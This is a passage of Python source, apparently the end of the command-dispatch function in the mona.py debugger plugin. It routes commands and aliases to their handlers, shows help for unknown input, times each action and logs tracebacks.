			commands["help"].parseProc(opts)
			return("")
		
		command = args[0]

		
		# ----- execute the chosen command ----- #
		if command in commands:
			if command.lower().strip() == "help":
				commands[command].parseProc(args)
			else:
				commands[command].parseProc(opts)
		
		else:
			# maybe it's an alias
			aliasfound = False
			for cmd in commands:
				if commands[cmd].alias == command:
					commands[cmd].parseProc(opts)
					aliasfound = True
			if not aliasfound:
				commands["help"].parseProc(None)
				return("** Invalid command **")
		
		# ----- report ----- #
		endtime = datetime.datetime.now()
		delta = endtime - starttime
		imm.logLines("[+] This mona.py action took %s\n" % str(delta))
		imm.setStatusBar("Done")

				
	except:
		imm.log("*" * 80,highlight=True)
		imm.logLines(traceback.format_exc(),highlight=True)
		imm.log("*" * 80,highlight=True)
		imm.error(traceback.format_exc())
		
	return ""